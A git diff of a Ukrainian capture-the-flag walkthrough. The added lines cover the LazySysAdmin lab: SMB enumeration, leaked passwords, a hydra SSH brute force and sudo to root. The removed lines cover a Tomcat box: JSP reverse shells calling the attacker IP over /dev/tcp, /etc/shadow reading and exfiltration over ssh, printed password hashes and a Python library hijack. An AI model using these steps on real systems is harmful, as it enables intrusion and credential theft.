@@ -5,438 +5,271 @@ netdiscover -r 192.168.160.0/24
 ![alt text](./Images/image1.png)
 
 ```sh
-nmap -sC -sV -Pn -p- 192.168.160.233
+nmap -sC -sV -Pn -p- 192.168.160.253
 ```
 **Результат**:  
-- **Port 22**: SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)).
-- **Port 80**: HTTP (Apache httpd 2.4.41 (Ubuntu).  
-- **Port 8080**: HTTP (Apache Tomcat 9.0.53).  
+- **Port 22**: SSH (OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)).
+- **Port 80**: HTTP (Apache httpd 2.4.7 (Ubuntu).  
+- **Port 139**: netbios-ssn (Samba smbd 3.X - 4.X (workgroup: WORKGROUP)).
+- **Port 445**: netbios-ssn (Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)).
+- **Port 3306**: mysql (MySQL (unauthorized)).
+- **Port 3337**: irc (InspIRCd).
 
 ![alt text](./Images/image2.png)
+
+![alt text](./Images/image3.png)
 
 ---
 
 ### **Крок 2: Веб-розвідка та пошук прихованих директорій**
-Відкриваємо **IP-адресу** цільової машини у браузері та бачимо **простий веб-сайт**.
-```plaintext
-http://192.168.160.233:80
-```
-**Результат**:
-Завантажилася типова сторінка сервера Apache.
 
-![alt text](./Images/image3.png)
-
-Виконаємо перебір каталогів на сервері **Apache** (порт 80, за замовчуванням) за допомогою команди **dirb**:
-```sh
-dirb http://192.168.160.233/ -X .php,.zip
-```
-**Результат**:
-Жодних підозрілих файлів виявлено не було.
+Відкриваємо в браузері `http://192.168.160.253`.
 
 ![alt text](./Images/image4.png)
 
-Відкриємо у браузері на порті **8080** IP-адресу цільової машини. Ми побачимо типову сторінку за замовчуванням сервера **Tomcat**.
-```plaintext
-http://192.168.160.233:8080
+Виконаємо перебір каталогів за допомогою команди **dirb**:
+```sh
+dirb http://192.168.160.253
 ```
 **Результат**:
-Ми отримали просту сторінку сервера **Tomcat**, на якій немає нічого підозрілого.
+- Встановлений WordPress за шляхом **/wordpress**
+- Доступна функція **phpinfo()** за шляхом **/info.php**
+- Встановлений веб-інтерфейс **phpMyAdmin**
 
 ![alt text](./Images/image5.png)
 
-Виконаємо перебір каталогів на сервері **Tomcat** (порт 8080) за допомогою команди **dirb**:
-```sh
-dirb http://192.168.160.233:8080/ -X .php,.zip
-```
-**Результат**:
-В одному з каталогів виявлено файл резервної копії **backup.zip**.
-
 ![alt text](./Images/image6.png)
-
----
-
-### **Крок 3: Дослідження файлу резервної копії backup.zip**
-
-Завантажимо **zip-файл** за допомогою **wget**: 
-```sh
-wget http://192.168.160.233:8080/backup.zip
-```
-**Результат**:
-Успішно завантажено файл резервної копії **backup.zip**.
 
 ![alt text](./Images/image7.png)
 
-Виконаємо спробу розпакувати файл **backup.zip** за допомогою **unzip**:
-```sh
-unzip backup.zip
-```
-**Результат**:
-Файл резервної копії **backup.zip** захищений паролем.
+---
+
+### **Крок 3: Дослідження WordPress**
 
 ![alt text](./Images/image8.png)
 
-Встановимо **fast password cracker — fcrackzip** за допомогою команди:
-```sh
-sudo apt install fcrackzip
-```
-**Результат**:
-Файл для взлому архівних паролів встановлено.
+передивляємось повідомлення форума:
 
 ![alt text](./Images/image9.png)
 
-Спробуємо підібрати пароль до архіву **backup.zip**, використовуючи текстовий файл **rockyou.txt** зі списком ключових слів.
-Застосуємо параметри
-    • за домогою ключа **-D** вкажемо режим словника; у цьому режимі **fcrackzip** зчитуватиме паролі з файлу, який повинен містити один пароль на рядок і має бути відсортований в алфавітному порядку; 
-    • ключ **-p** вказує шаблон для підбору пароля; 
-    • ключ **-u** інформує про те, що потрібно використовувати команду unzip для перевірки пароля. 
-Використаємо **fcrackzip** зі списком слів **rockyou.txt** для злому пароля:
+Єдиний висновок - адмін залишив обліковий запис за замовчанням. Тобто можна спробувати **wpscan** з брутфорсом за словником.
+
+---
+
+### **Крок 4: Дослідження сервісу SMB (Самба)**
+
 ```sh
-fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
-ls
+enum4linux -a 192.168.160.253
 ```
+```plaintext
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 21 14:19:37 2026
+ ==========================( Target Information )==========================
+Target ........... 192.168.160.253
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+ ===========( Enumerating Workgroup/Domain on 192.168.160.253 )===========
+[+] Got domain/workgroup name: WORKGROUP
+ ==============( Nbtstat Information for 192.168.160.253 )===============
+Looking up status of 192.168.160.253
+        LAZYSYSADMIN    <00> -         B <ACTIVE>  Workstation Service
+        LAZYSYSADMIN    <03> -         B <ACTIVE>  Messenger Service
+        LAZYSYSADMIN    <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+ ==================( Session Check on 192.168.160.253 )==================
+[+] Server 192.168.160.253 allows sessions using username '', password ''
+
+ ==============( Getting domain SID for 192.168.160.253 )==============
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                        
+                                                                                                                                                          
+ =================( OS information on 192.168.160.253 )=================
+[E] Can't get OS info with smbclient                                                                                                                        
+[+] Got OS info for 192.168.160.253 from srvinfo:                                                                                                           
+        LAZYSYSADMIN   Wk Sv PrQ Unx NT SNT Web server                                                                                                      
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+ ======================( Users on 192.168.160.253 )======================
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                     
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+ ===============( Share Enumeration on 192.168.160.253 )===============
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        share$          Disk      Sumshare
+        IPC$            IPC       IPC Service (Web server)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAZYSYSADMIN
+
+[+] Attempting to map shares on 192.168.160.253                                                                                                             
+                                                                                                                                                            
+//192.168.160.253/print$        Mapping: DENIED Listing: N/A Writing: N/A                                                                                   
+//192.168.160.253/share$        Mapping: OK Listing: OK Writing: N/A
+
+[E] Can't understand response:                                                                                                                              
+                                                                                                                                                            
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                  
+//192.168.160.253/IPC$  Mapping: N/A Listing: N/A Writing: N/A
+ ==========( Password Policy Information for 192.168.160.253 )==========                                                                                                                                                            
+Password:                                                                                                                                                   
+[+] Attaching to 192.168.160.253 using a NULL share
+[+] Trying protocol 139/SMB...
+[+] Found domain(s):
+        [+] LAZYSYSADMIN
+        [+] Builtin
+[+] Password Info for Domain: LAZYSYSADMIN
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: Not Set
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: Not Set
+[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                                                                                                                                                                                                                                                                
+Password Complexity: Disabled                                                                                                                               
+Minimum Password Length: 5
+ ====================( Groups on 192.168.160.253 )====================                                                                                                                                                                                                                                                                                                                        
+[+] Getting builtin groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+[+]  Getting builtin group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                             
+[+]  Getting local groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+[+]  Getting local group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                               
+[+]  Getting domain groups:                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+[+]  Getting domain group memberships:                                                                                                                                                                                                                                                                                                                                                                                                                                              
+ ====( Users on 192.168.160.253 via RID cycling (RIDS: 500-550,1000-1050) )====
+[I] Found new SID:                                                                                                                                          
+S-1-22-1                                                                                                                                                    
+
+[I] Found new SID:                                                                                                                                          
+S-1-5-32                                                                                                                                                    
+
+[I] Found new SID:                                                                                                                                          
+S-1-5-32                                                                                                                                                    
+
+[I] Found new SID:                                                                                                                                          
+S-1-5-32                                                                                                                                                    
+
+[I] Found new SID:                                                                                                                                          
+S-1-5-32                                                                                                                                                    
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                 
+                                                                                                                                                            
+S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                           
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
+                                                                                                                                                            
+S-1-22-1-1000 Unix User\togie (Local User)                                                                                                                  
+
+[+] Enumerating users using SID S-1-5-21-2952042175-1524911573-1237092750 and logon username '', password ''                                                
+S-1-5-21-2952042175-1524911573-1237092750-501 LAZYSYSADMIN\nobody (Local User)                                                                              
+S-1-5-21-2952042175-1524911573-1237092750-513 LAZYSYSADMIN\None (Domain Group)
+
+ ===============( Getting printer info for 192.168.160.253 )===============
+No printers returned.                                                                                                                                       
+enum4linux complete on Wed Oct 21 14:19:51 2026
+```
+
 **Результат**:
-Ми отримали пароль **@administrator_hi5**.
+Маємо обліковий запис локального користувача: **S-1-22-1-1000 Unix User\togie (Local User)**
+
+Спробуємо зайти на самбу
 
 ![alt text](./Images/image10.png)
 
-Розпакуємо файл backup.zip і переглянемо його вміст:
-```sh
-unzip backup.zip
-```
-**Результат**:
-Ми отримали список файлів з архіву **backup.zip**
-
 ![alt text](./Images/image11.png)
-
----
-
-### **Крок 4: Дослідження службових файлів Tomcat**
-
-Перевіримо вміст **XML-файлу** користувачів **Tomcat**. Виконаємо команду: 
-```sh
-cat tomcat-users.xml
-```
-**Результат**:
-Файл **tomcat-users.xml** містить облікові дані:
-- Користувач: **admin**
-- Пароль: **melehifokivai**
 
 ![alt text](./Images/image12.png)
 
----
+Переглядаємо зміст файлів з метою отримання корисної інформації, особливу увагу приділяємо файлу **deets.txt**
 
-### **Крок 5: Створення зворотньої оболонки для Tomcat**
-
-Визначимо **IP адресу** нашої системи. Виконаємо команду:
-```sh
-ip a
-```
-**Результат**:  
-**IP** адреса нашої системи **192.168.160.198**.
+**Результат**:
+**Password: 12345**
 
 ![alt text](./Images/image13.png)
 
-Створимо war-файл за допомогою **msfvenom**. Використаємо параметри
-- **LHOST**: IP-адреса нашого інструменту, використаємо знайдену **192.168.160.198**; 
-- **LPORT**: порт прослуховування на машині інструменту, виберемо, наприклад, **4321**; 
-- Формат виводу: **WAR** — архів веб-застосунків. 
-```sh
-msfvenom -p java/jsp_shell_reverse_tcp LHOST= 192.168.160.198 LPORT= 4321 -f war -o revshell.war
-ls
-```
-**Результат**:  
-Зворотня оболонка **revshell.war** створена.
+Також маємо корисну інформацію у файлі **wp-config.php**
+
+**Результат**:
+**DB_PASSWORD: TogieMYSQL12345^^**
 
 ![alt text](./Images/image14.png)
 
 ---
 
-### **Крок 6: Завантаження зворотньої оболонки на цільовий комп'ютер**
+### **Крок 5: Дослідження ssh**
 
-Використовуючи виявлені облікові дані **admin:melehifokivai**, виконаємо вхід в програму **Tomcat Manager**. Зайдемо у браузері на порт **8080** цільової машини **192.168.160.233**.
-Клікнемо на кнопку **manager app**, введемо облікові дані та залогуємося за допомогою **sign in**
-- Користувач: **admin**
-- Пароль: **melehifokivai**
+Робимо спробу брутфорса ssh, бо маємо логін користувача:
+```sh
+hydra 192.168.160.253 -t 4 -l togie -P /usr/share/wordlists/rockyou.txt ssh
+```
+**Результат**:  
+**[22][ssh] host: 192.168.160.253   login: togie   password: 12345**.
 
 ![alt text](./Images/image15.png)
 
-**Результат**:
-Ми отримали доступ до панелі керування аплікаціями на вебсервері **Tomcat**.
+Спробуємо залогінитися через **SSH**
+```sh
+ssh togie@192.168.160.253
+```
+**Результат**:  
+Успішний вхід
 
 ![alt text](./Images/image16.png)
 
-Знайдемо на сторінці керування розділ із завантаженням нових **WAR** файлів. Клікнемо **Browse**
-
-![alt text](./Images/image17.png)
-
-Завантажимо створений на попередньому кроці **revshell.war**. Виберемо з папки home файл **revshell.war**
-
-![alt text](./Images/image18.png)
-
-За допомогою кнопки **Deploy** розгорнемо аплікацію зворотньої оболонки на сервері **Tomcat**
-
-**Результат**:
-Наша аплікація **revshell.war** розгорнута на цільовому сервері **Tomcat** і доступна по **URL http://192.168.160.233:8080/revshell**
-
-![alt text](./Images/image19.png)
-
----
-
-### **Крок 7: Дослідження цільової системи на наявність конфіденційних файлів у профілях користувачів**
-
-Для аналізу мережевих з'єднань застосуємо команду **netcat**. Використаємо параметри
-- ключ **-l** задає режим прослуховування разом із номером порту; 
-- ключ **-n** означає не виконувати пошук портів та працювати з **IP-адресами** безпосередньо, без використання **DNS**; 
-- ключ **-p** вказує на номер порту; 
-- ключ **-v** задає детальний режим виводу.
-
-Виконаємо команду **netcat**, щоб прослухати зворотну оболонку:
-```sh
-nc -lnvp 4321
-```
-**Результат**:
-Утиліта **netcat** розпочала прослуховування запитів на порті **4321** нашої системи
-
-![alt text](./Images/image20.png)
-
-Зайдемо у браузері на ресурс **/revshell/** цільової машини **192.168.160.233** на порті **8080**.
-**Не спрацьовує**.
-
-Створив файл **index.jsp** зі вмістом
-```plaintext
-<%@page import="java.lang.*,java.io.*,java.net.*"%>
-<%
-    String host = "192.168.160.198";
-    int port = 4321;
-    Process p = new ProcessBuilder("/bin/bash", "-c", "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1").start();
-%>
-```
-Запакував цей один файл в архів **.war** за допомогою утиліти **zip**
-```sh
-zip rev.war index.jsp
-```
-
-![alt text](./Images/image21.png)
-
-Після запуску корисного навантаження ми отримали оболонку. Для покращення середовища оболонки використаємо **Python**:
-```sh
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-**Результат**:
-Ми отримали доступ до оболонки **bash** на цільовому комп'ютері. Це дозволить нам розпочати досліджувати систему на наявність конфіденційних файлів та потенційних шляхів для підвищення привілеїв.
-
-Перевіряємо домашні каталоги користувачів
-```sh
-cd /home
-ls
-cd jaye
-ls
-cd /home/randy
-ls
-```
-**Результат**:
-У домашній папці користувача **randy** ми знайшли цікаві файли **user.txt** та **note.txt**.
-
-![alt text](./Images/image22.png)
-
-Розглянемо вміст файлів **user.txt** та **note.txt**. Виконаємо команди:
-```sh
-cat user.txt
-cat note.txt
-```
-**Результат**:
-З файлу **user.txt** ми отримали прапорець, який разом із повідомленням із **note.txt**, дає нам підказки для подальших дій.
-```sh
-cat user.txt
-```
-```plaintext
-ca73a018ae6908a7d0ea5d1c269ba4b6
-```
-![alt text](./Images/image23.png)
-
----
-
-### **Крок 8: Дослідження цільової системи на наявність конфіденційних файлів у профілях користувачів**
-
-Спробуємо увійти в систему як користувач **jaye**. Використаємо той самий пароль **melehifokivai**. Виконаємо команду:
-```sh
-ssh jaye@192.168.160.233
-```
-**Результат**:
-Ми успішно ввійшли в систему через **SSH**.
-
-![alt text](./Images/image24.png)
-
-Залогувавшись використовуємо **Python** для отримання повністю інтерактивної оболонки. Виконаємо команду:
-```sh
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-**Результат**:
-Ми отримали доступ до оболонки **bash** на цільовому комп'ютері від імені користувача **jaye**.
-
-![alt text](./Images/image25.png)
-
-Дослідимо файлову систему користувача **jaye**. Виконаємо команди:
-```sh
-ls
-cd Files
-ls -lah
-```
-![alt text](./Images/image26.png)
-
-Використаємо команду **look** для отримання хешу паролів всіх користувачів системи. Параметри командної стрічки виберемо такі
-- скористаємося змінною **LFILE="file to read"** для визначення файлу; 
-- рядок з префіксом залишимо порожній **('')**, щоб програма **look** вивела усі знайдені рядки.
-
-```sh
-./look
-LFILE=/etc/shadow
-./look '' $LFILE
-```
-**Результат**:
-Ми отримали захешовані паролі користувачів системи.
-
-![alt text](./Images/image27.png)
-
-![alt text](./Images/image28.png)
-
-Збережемо захешовані паролі користувачів у файлі **hashall.txt** на нашому інструменті **Kali**. Виконаємо схожу команду та перенаправимо вивід у домашній каталог користувача **kali**. При запиті задамо підтвердження yes та введемо пароль користувача **kali**:
-```sh
-./look '' $LFILE | ssh kali@192.168.160.198 "cat >> ~/hashall.txt"
-```
-![alt text](./Images/image29.png)
-
-**Отримую помилку.**
-Створюю файл через **UI** і копіюю хешовані паролі трьох користувачів:
-```plaintext
-randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
-tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
-jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
-```
-Скопіюємо з файлу **hashall.txt** рядок з даними користувача **randy**. Збережемо результат у файл з назвою **hash.txt**:
-```sh
-cat hashall.txt | grep randy > hash.txt
-cat hash.txt
-```
-**Результат**:
-У файлі **hash.txt** збережено інформацію про користувача **randy**.
-
-![alt text](./Images/image30.png)
-
----
-
-### **Крок 9: Визначення пароля користувача randy**
-
-Щоб зламати хеш код використаємо інструмент для злому паролів **john**. Виконаємо команду з ключем допомоги:
-```sh
-john --help
-```
-Розглянемо параметри командної стрічки
-- синтаксис команди: **john [OPTIONS] [PASSWORD-FILES]** 
-- ключ: **--wordlist[=FILE] --stdin** означає використовувати режим списку слів, прочитати слова з файлу або з **stdin**.
-Для пришвидшення операції використаємо набір слів з файлу **/usr/share/wordlists/rockyou.txt**. Перевіримо існування файлу:
-```sh
-ls /usr/share/wordlists
-```
-Для зламу хеш коду виконаємо команду вказавши список слів за допомогою параметра **--wordlist**:
-```sh
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-Операція може зайняти тривалий час, від кількох до кільканадцять годин в залежності від потужності Вашої системи. Клікаючи в консолі довільну клавішу, за винятком **"q" та "Ctrl+C"**, ми зможемо відстежувати статус виконання операції.
-
-**Результат**:
-Ми отримали пароль корситувача **randy: 07051986randy**
-
-![alt text](./Images/image31.png)
-
----
-
-### **Крок 10: Дослідження потенційних шляхів для підвищення привілеїв**
-
-Використаємо зламаний аккаунт користувача randy щоб залогуватися у досліджувану систему по **SSH**. Виконаємо команду:
-```sh
-ssh randy@192.168.160.233
-```
-**Результат**:
-Ми ввійшли у цільову систему використавши пароль **07051986randy** користувача **randy**.
-
-![alt text](./Images/image32.png)
-
-Перевіримо наявність привілеїв облікового запису за допомогою команди:
+Перевіряємо дозволи:
 ```sh
 sudo -l
 ```
-![alt text](./Images/image33.png)
+**Результат**:  
+Користувач **togie** має права виконання від **root** без введення паролю
 
-Розглянемо вміст файлу **/home/randy/randombase64.py**. Виконаємо команду:
+![alt text](./Images/image17.png)
+
+Вводимо команду
 ```sh
-pwd
-cat randombase64.py
+sudo -i
 ```
 **Результат**:
-Cкрипт **randombase64.py** імпортує модуль з назвою **base64**. Це говорить про потенційну можливість захоплення бібліотеки **Python**. Ми можемо модифікувати бібліотеку **base64.py** для виконання довільних команд з привілеями **root**.
+Перейшли на **root** користувача
 
-![alt text](./Images/image34.png)
+![alt text](./Images/image18.png)
 
-Щоб отримати шлях до файлу **base64.py** використаємо команду **locate**:
-```sh
-locate base64.py
-```
+Досліджуємо домашню директорію рута та бачимо цікавий файл, виводимо його зміст
+
 **Результат**:
-Ми отримали повний шлях до файлу **/usr/lib/python3.8/base64.py**
+Ми пройшли **LazySysAdmin**
 
-![alt text](./Images/image35.png)
-
-Розглянемо права доступу до файлу **/usr/lib/python3.8/base64.py**. Виконаємо команду:
-```sh
-ls -al /usr/lib/python3.8/base64.py
-```
-**Результат**:
-Доступ до файлу **/usr/lib/python3.8/base64.py** має користувач та група **root**. Отже, процес, запущений від імені **base64.py**, отримає права **root**.
-
-![alt text](./Images/image36.png)
-
-Відкриємо файл **/usr/lib/python3.8/base64.py** для редагування. Використаємо команду:
-```sh
-nano /usr/lib/python3.8/base64.py
-```
-**Результат**:
-Файл **/usr/lib/python3.8/base64.py** доступний для редагування.
-Додамо до файлу команду для створення **root-оболонки**. Вставимо наступний код, щоб отримати **root-доступ** до цільового комп'ютера.
-
-```plaintext
-import os
-os.system("/bin/bash")
-```
-Збережемо внесені зміни клікнувши послідовно **Ctrl+O** та **Ctrl+X**.
-
-![alt text](./Images/image37.png)
-
-Перевіримо результат внесених змін. Виведемо на консоль перші 16 стрічок файлу **/usr/lib/python3.8/base64.py**:
-```sh
-head -n 16 /usr/lib/python3.8/base64.py
-```
-**Результат**:
-Ми модифікували модуль **base64.py** бібліотеки пайтон і тепер можемо підвищити власні привілеї.
-
-![alt text](./Images/image38.png)
-
-За допомогою **sudo** запустимо скрипт **/home/randy/randombase64.py**. Цей скрипт запустить модифікований **/usr/lib/python3.8/base64.py** та створить для нас **root-оболонку**. Виконаємо команду використавши пароль **07051986randy**:
-```sh
-sudo /usr/bin/python3.8 /home/randy/randombase64.py
-```
-**Результат**:
-Використавши модуль **base64.py** ми отримали **root-доступ** до цільової системи.
-
-![alt text](./Images/image39.png)
-
-Отримавши доступ до всієї системи перейдемо до домашнього каталогу користувача **root** та відобразимо прапорець **root.txt**. Виконаємо команди:
-```sh
-cd ~
-pwd
-ls
-cat root.txt
-```
-![alt text](./Images/image40.png)
+![alt text](./Images/image19.png)
 
 ---
